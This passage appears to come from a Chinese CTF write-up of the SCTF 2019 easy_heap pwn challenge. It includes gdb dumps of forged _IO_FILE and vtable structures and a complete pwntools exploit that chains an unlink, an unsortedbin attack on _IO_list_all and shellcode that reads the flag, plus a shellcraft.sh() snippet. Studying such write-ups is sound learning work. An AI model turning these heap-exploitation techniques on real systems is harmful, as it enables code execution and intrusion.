<p>这里主要说一下后面的伪造IO_FILE:<br>当进行unsortedbin attack时，由于bk被修改为_IO_list_all-0x10，解链后_IO_list_all处的内容变为main_arena+0x58:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p &amp;_IO_list_all</span><br><span class="line">$1 = (struct _IO_FILE_plus **) 0x7ffff7dd2520 &lt;_IO_list_all&gt;</span><br><span class="line">gdb-peda$ x /8gx 0x7ffff7dd2520</span><br><span class="line">0x7ffff7dd2520 &lt;_IO_list_all&gt;:  0x00007ffff7dd1b78  0x0000000000000000</span><br><span class="line">0x7ffff7dd2530: 0x0000000000000000  0x0000000000000000</span><br><span class="line">0x7ffff7dd2540 &lt;_IO_2_1_stderr_&gt;:   0x00000000fbad2087  0x00007ffff7dd25c3</span><br><span class="line">0x7ffff7dd2550 &lt;_IO_2_1_stderr_+16&gt;:    0x00007ffff7dd25c3  0x00007ffff7dd25c3</span><br></pre></td></tr></table></figure></p>
<p>因此程序认为在main_arena+0x58是第一个IO_FILE，在main_arena+0x58处伪造的IO_FILE结构如下，_chain是下一个_IO_FILE的地址，_chain的位置正好是smallbin[4]的位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p (*(struct _IO_FILE_plus*) 0x00007ffff7dd1b78)</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0x55757230, </span><br><span class="line">    _IO_read_ptr = 0x555555757040 &quot;&quot;, </span><br><span class="line">    _IO_read_end = 0x555555757040 &quot;&quot;, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd2510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x7ffff7dd1b88 &lt;main_arena+104&gt; &quot;@puUUU&quot;, </span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd1b88 &lt;main_arena+104&gt; &quot;@puUUU&quot;, </span><br><span class="line">    _IO_write_end = 0x7ffff7dd1b98 &lt;main_arena+120&gt; &quot;\210\033\335\367\377\177&quot;, </span><br><span class="line">    _IO_buf_base = 0x7ffff7dd1b98 &lt;main_arena+120&gt; &quot;\210\033\335\367\377\177&quot;, </span><br><span class="line">    _IO_buf_end = 0x7ffff7dd1ba8 &lt;main_arena+136&gt; &quot;\230\033\335\367\377\177&quot;, </span><br><span class="line">    _IO_save_base = 0x7ffff7dd1ba8 &lt;main_arena+136&gt; &quot;\230\033\335\367\377\177&quot;, </span><br><span class="line">    _IO_backup_base = 0x7ffff7dd1bb8 &lt;main_arena+152&gt; &quot;\250\033\335\367\377\177&quot;, </span><br><span class="line">    _IO_save_end = 0x7ffff7dd1bb8 &lt;main_arena+152&gt; &quot;\250\033\335\367\377\177&quot;, </span><br><span class="line">    _markers = 0x555555757040, </span><br><span class="line">    _chain = 0x555555757040, </span><br><span class="line">    _fileno = 0xf7dd1bd8, </span><br><span class="line">    _flags2 = 0x7fff, </span><br><span class="line">    _old_offset = 0x7ffff7dd1bd8, </span><br><span class="line">    _cur_column = 0x1be8, </span><br><span class="line">    _vtable_offset = 0xdd, </span><br><span class="line">    _shortbuf = &lt;incomplete sequence \367&gt;, </span><br><span class="line">    _lock = 0x7ffff7dd1be8 &lt;main_arena+200&gt;, </span><br><span class="line">    _offset = 0x7ffff7dd1bf8, </span><br><span class="line">    _codecvt = 0x7ffff7dd1bf8 &lt;main_arena+216&gt;, </span><br><span class="line">    _wide_data = 0x7ffff7dd1c08 &lt;main_arena+232&gt;, </span><br><span class="line">    _freeres_list = 0x7ffff7dd1c08 &lt;main_arena+232&gt;, </span><br><span class="line">    _freeres_buf = 0x7ffff7dd1c18 &lt;main_arena+248&gt;, </span><br><span class="line">    __pad5 = 0x7ffff7dd1c18, </span><br><span class="line">    _mode = 0xf7dd1c28, </span><br><span class="line">    _unused2 = &quot;\377\177\000\000(\034\335\367\377\177\000\000\070\034\335\367\377\177\000&quot;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd1c38 &lt;main_arena+280&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当申请一个较小的chunk时，由于sunortedbin中的chunk属于smallbin的范围，chunk进入smallbin中，大小为0x60的chunk进入smallbin[4]：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heapinfo</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x0</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">(0x90)     fastbin[7]: 0x0</span><br><span class="line">(0xa0)     fastbin[8]: 0x0</span><br><span class="line">(0xb0)     fastbin[9]: 0x0</span><br><span class="line">                  top: 0x555555757230 (size : 0x20dd0) </span><br><span class="line">       last_remainder: 0x555555757040 (size : 0x60) </span><br><span class="line">            unsortbin: 0x555555757040 (size : 0x60)</span><br><span class="line">(0x060)  smallbin[ 4]: 0x555555757040 (overlap chunk with 0x555555757040(freed) )</span><br></pre></td></tr></table></figure></p>
<p>在unsortedbin中伪造下一个IO_FILE结构，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p (*(struct _IO_FILE_plus*) 0x555555757040)</span><br><span class="line">$3 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 0x0, </span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, </span><br><span class="line">    _IO_read_end = 0x7ffff7dd1bc8 &lt;main_arena+168&gt; &quot;\270\033\335\367\377\177&quot;, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd1bc8 &lt;main_arena+168&gt; &quot;\270\033\335\367\377\177&quot;, </span><br><span class="line">    _IO_write_base = 0x2 &lt;error: Cannot access memory at address 0x2&gt;, </span><br><span class="line">    _IO_write_ptr = 0x3 &lt;error: Cannot access memory at address 0x3&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0x0, </span><br><span class="line">    _flags2 = 0x0, </span><br><span class="line">    _old_offset = 0x0, </span><br><span class="line">    _cur_column = 0x0, </span><br><span class="line">    _vtable_offset = 0x0, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0x0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0x0, </span><br><span class="line">    _mode = 0x0, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x555555756070</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>在虚表指针的位置伪造函数跳转表，修改函数跳转地址为mmap_addr,程序跳转到mmap_addr，该段内存是可读可写可执行的，执行shellcode，读取flag文件并输出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p (*(struct _IO_jump_t *)0x555555756070)</span><br><span class="line">$4 = &#123;</span><br><span class="line">  __dummy = 0xcacb33e000, </span><br><span class="line">  __dummy2 = 0xcacb33e000, </span><br><span class="line">  __finish = 0xcacb33e000, </span><br><span class="line">  __overflow = 0xcacb33e000, </span><br><span class="line">  __underflow = 0xcacb33e000, </span><br><span class="line">  __uflow = 0xcacb33e000, </span><br><span class="line">  __pbackfail = 0xcacb33e000, </span><br><span class="line">  __xsputn = 0xcacb33e000, </span><br><span class="line">  __xsgetn = 0xcacb33e000, </span><br><span class="line">  __seekoff = 0xcacb33e000, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x0, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>完整exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">context.terminal = [<span class="string">"tmux"</span>,<span class="string">"split"</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">   p = process(<span class="string">"./easy_heap"</span>)</span><br><span class="line">   libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   p = remote(<span class="string">"132.232.100.67"</span>,<span class="number">10004</span>)</span><br><span class="line">   libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'1'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">   p.sendline(str(size))</span><br><span class="line">   p.recvuntil(<span class="string">"Address "</span>)</span><br><span class="line">   heap_ptr = int(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line">   <span class="keyword">print</span> hex(heap_ptr)</span><br><span class="line">   <span class="keyword">return</span> heap_ptr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span> </span><br><span class="line">   p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'2'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">   p.sendline(<span class="string">'3'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line">   p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">   p.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code = <span class="string">"""</span></span><br><span class="line"><span class="string">        xor rsi,rsi</span></span><br><span class="line"><span class="string">        mov rax,SYS_open</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        call here</span></span><br><span class="line"><span class="string">        .string "./flag"</span></span><br><span class="line"><span class="string">        here:</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,rax</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x100</span></span><br><span class="line"><span class="string">        mov rax,SYS_read</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,1</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x100</span></span><br><span class="line"><span class="string">        mov rax,SYS_write</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rax,SYS_exit</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">shellcode = asm(code,arch=<span class="string">"amd64"</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Mmap: "</span>)</span><br><span class="line">mmap_addr = int(p.recvuntil(<span class="string">'\n'</span>,drop=<span class="keyword">True</span>),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(mmap_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##unlink</span></span><br><span class="line">heap_list = add(<span class="number">0xf8</span>) - <span class="number">0x8</span> <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xf0</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0xf0</span>)</span><br><span class="line">payload += p64(heap_list+<span class="number">0x8</span><span class="number">-0x18</span>) + p64(heap_list+<span class="number">0x8</span><span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(<span class="number">0xf0</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##mmap_addr-&gt;shellcode</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xf8</span>) + p64(heap_list<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x1000</span>) + p64(mmap_addr)</span><br><span class="line">edit(<span class="number">0</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line">edit(<span class="number">1</span>,shellcode+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##unsorted bin size: 0x1c1-&gt;0x61</span></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#3</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xf8</span>) + p64(heap_list<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">8</span>) + <span class="string">'\x48'</span> + <span class="string">'\n'</span> <span class="comment">#unsortedbin size</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'\x61\x00'</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##unsortedbin attack</span></span><br><span class="line"><span class="comment">##bk -&gt; IO_list_all-0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xf8</span>) + p64(heap_list<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">8</span>) + <span class="string">'\x58'</span> + <span class="string">'\n'</span> <span class="comment">#unsortedbin bk</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'\x10\x25'</span>+<span class="string">'\n'</span>) <span class="comment">#IO_list_all</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##fake vtable</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xf8</span>) + p64(heap_list<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x1000</span>) + <span class="string">'\x60'</span> + <span class="string">'\n'</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">fake_vtable = (heap_list - <span class="number">0x202060</span>) + <span class="number">0x202070</span></span><br><span class="line">payload = p64(<span class="number">2</span>) + p64(<span class="number">3</span>)</span><br><span class="line">payload  = payload.ljust(<span class="number">0xb8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(fake_vtable)</span><br><span class="line">edit(<span class="number">3</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">##</span></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0xf8</span>) + p64(heap_list<span class="number">-0x10</span>)</span><br><span class="line">payload += p64(mmap_addr) * <span class="number">10</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload+<span class="string">'\n'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">##trigger</span></span><br><span class="line">p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>预期解里面的shellcode参照官方exp，不能执行，因为生成的是32位的shellcode，问了学弟终于找到原因了，需要加一句context.update指定64位的环境，然后生成的shellcode就是64位了：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">context.update(arch=<span class="string">"amd64"</span>,os=<span class="string">"linux"</span>,log_level = <span class="string">"DEBUG"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://bbs.pediy.com/thread-225849.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-225849.htm</a><br>SCTF 2019 官方 Write-Up</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/pwn/" rel="tag"># pwn</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/06/23/KCTF2019-Q2部分pwn题/" rel="next" title="KCTF2019 Q2部分pwn题">
                <i class="fa fa-chevron-left"></i> KCTF2019 Q2部分pwn题
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/06/28/Linux-kernel-pwn基础/" rel="prev" title="Linux kernel pwn基础">
                Linux kernel pwn基础 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">55</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">16</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#one-heap"><span class="nav-number">1.</span> <span class="nav-text">one_heap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述"><span class="nav-number">1.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#新的劫持控制流方式"><span class="nav-number">1.2.</span> <span class="nav-text">新的劫持控制流方式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用过程"><span class="nav-number">1.3.</span> <span class="nav-text">利用过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#two-heap"><span class="nav-number">2.</span> <span class="nav-text">two_heap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述-1"><span class="nav-number">2.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用过程-1"><span class="nav-number">2.2.</span> <span class="nav-text">利用过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#预期解"><span class="nav-number">2.3.</span> <span class="nav-text">预期解</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-heap"><span class="nav-number">3.</span> <span class="nav-text">easy_heap</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#预期解-1"><span class="nav-number">3.1.</span> <span class="nav-text">预期解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#补充"><span class="nav-number">3.2.</span> <span class="nav-text">补充</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"></span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
